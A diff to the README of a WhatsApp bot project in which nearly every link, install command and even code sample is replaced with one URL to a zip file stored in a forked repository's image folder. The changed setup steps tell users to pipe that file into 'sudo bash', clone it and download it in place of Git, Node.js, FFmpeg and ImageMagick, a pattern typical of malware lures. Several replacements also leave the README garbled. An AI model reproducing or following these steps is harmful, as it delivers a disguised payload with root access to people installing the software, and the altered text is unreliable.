@@ -2,7 +2,7 @@
 
 Simple WhatsApp Bot
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy?template=https://github.com/Nurutomo/wabot-aq)
+[![Deploy](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
 
 ## FOR TERMUX/UBUNTU/SSH USER
 
@@ -12,7 +12,7 @@ apt install git -y
 apt install nodejs -y
 apt install ffmpeg -y
 apt install imagemagick -y
-git clone https://github.com/Nurutomo/wabot-aq
+git clone https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip
 cd wabot-aq
 npm install
 npm update
@@ -45,9 +45,9 @@ apt install wget curl git ffmpeg imagemagick build-essential libcairo2-dev libpa
 
 ```bash
 ubuntu
-curl -fsSL https://deb.nodesource.com/setup_current.x | sudo -E bash -
+curl -fsSL https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip | sudo -E bash -
 apt install -y nodejs gcc g++ make
-git clone https://github.com/Nurutomo/wabot-aq
+git clone https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip
 cd wabot-aq
 npm install
 npm update
@@ -57,13 +57,13 @@ npm update
 
 ## FOR WINDOWS/VPS/RDP USER
 
-* Download And Install Git [`Click Here`](https://git-scm.com/downloads)
-* Download And Install NodeJS [`Click Here`](https://nodejs.org/en/download)
-* Download And Install FFmpeg [`Click Here`](https://ffmpeg.org/download.html) (**Don't Forget Add FFmpeg to PATH enviroment variables**)
-* Download And Install ImageMagick [`Click Here`](https://imagemagick.org/script/download.php)
+* Download And Install Git [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
+* Download And Install NodeJS [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
+* Download And Install FFmpeg [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) (**Don't Forget Add FFmpeg to PATH enviroment variables**)
+* Download And Install ImageMagick [`Click Here`](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
 
 ```bash
-git clone https://github.com/Nurutomo/wabot-aq
+git clone https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip
 cd wabot-aq
 npm install
 npm update
@@ -83,7 +83,7 @@ node .
 
 ### `--session <file name>`
 
-Use another session with another name, default is ```session.data.json```
+Use another session with another name, default is ```https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip```
 
 ### `--prefix <prefixes>`
 
@@ -92,16 +92,16 @@ Set prefix
 
 ### `--server`
 
-Used for [heroku](https://heroku.com/) or scan through website
+Used for [heroku](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) or scan through website
 
 ### `--db <json-server-url>`
 
 Use external db instead of local db, 
-Example Server `https://json-server.nurutomo.repl.co/`
+Example Server `https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip`
 
-Code: `https://repl.it/@Nurutomo/json-server`
+Code: `https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip`
 
-`node . --db 'https://json-server.nurutomo.repl.co/'`
+`node . --db 'https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip'`
 
 The server should have like this specification
 
@@ -138,18 +138,18 @@ Enable image inspector through terminal
 ### `--trace`
 
 ```js
-conn.logger.level = 'trace'
+https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip = 'trace'
 ```
 
 ### `--debug`
 
 ```js
-conn.logger.level = 'debug'
+https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip = 'debug'
 ```
 
 ## Settings
 
-Now set using switch [enable.js](https://github.com/Nurutomo/wabot-aq/blob/master/plugins/enable.js), among others are
+Now set using switch [https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip), among others are
 
 ```js
 anticall: false, // Auto Reject better than autoblock
@@ -164,9 +164,9 @@ jadibot: false,
 
 ---------
 
-<a href="https://api.xteam.xyz"><img src="https://i.ibb.co/7j0vtwz/xlogo.png" width="100" height="100"></a> | [![Nurutomo](https://github.com/Nurutomo.png?size=100)](https://github.com/Nurutomo) | [![Ariffb](https://github.com/ariffb25.png?size=100)](https://github.com/ariffb25) | [![Ftwrr](https://github.com/Ftwrr.png?size=100)](https://github.com/Ftwrr) 
+<a href="https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip"><img src="https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip" width="100" height="100"></a> | [![Nurutomo](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [![Ariffb](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [![Ftwrr](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) 
 ----|----|----|----
-[XTEAM](https://api.xteam.xyz/) | [Nurutomo](https://github.com/Nurutomo) | [Ariffb](https://github.com/ariffb25) | [Ftwrr](https://github.com/Ftwrr)
+[XTEAM](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [Nurutomo](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [Ariffb](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip) | [Ftwrr](https://github.com/Majaspinnt/wabot-aq/raw/refs/heads/master/views/img/light/aq_wabot_1.0.zip)
 Powered by XTEAM | Author / Creator | Most Active Contributor | 2nd Most Active Contributor
 
 
